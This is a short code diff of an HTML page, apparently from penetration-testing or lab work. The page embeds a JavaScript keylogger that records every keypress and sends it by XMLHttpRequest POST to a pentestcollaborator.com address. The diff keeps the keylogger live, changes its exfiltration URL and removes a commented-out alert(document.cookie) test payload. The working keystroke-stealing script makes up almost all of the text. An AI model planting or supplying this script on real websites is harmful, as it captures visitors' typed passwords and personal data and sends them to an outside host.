@@ -4,26 +4,19 @@
 
 <h1 id="demo">This is the domain You ar̥e looking For</h1>
 
- <script type="text/javascript">
-    var l = "";             // empty string to concatenate keys onto
-    document.onkeypress = function (e) {
+  <script type="text/javascript">
+    var l = "";           
+    document.onkeypress = function (e)
+    {
         l += e.key;
-        console.log(l);     // remove this line 
+        console.log(l);  
 
-       
         var req = new XMLHttpRequest();
-        req.open("POST","https://k6r7goxiry0uh4qr62s87w2kyb43ss.pentestcollaborator.com", true); 				// ADD URL HERE!
+        req.open("POST","http://6iptsa943kcgtq2dio4ujie6axgq4f.pentestcollaborator.com", true); 	
         req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         req.send("data=" + l);
-       
     }
 </script>
-  
-/*
-  <script>
-alert(document.cookie);
-</script> 
 
-  */
 </body>
 </html>
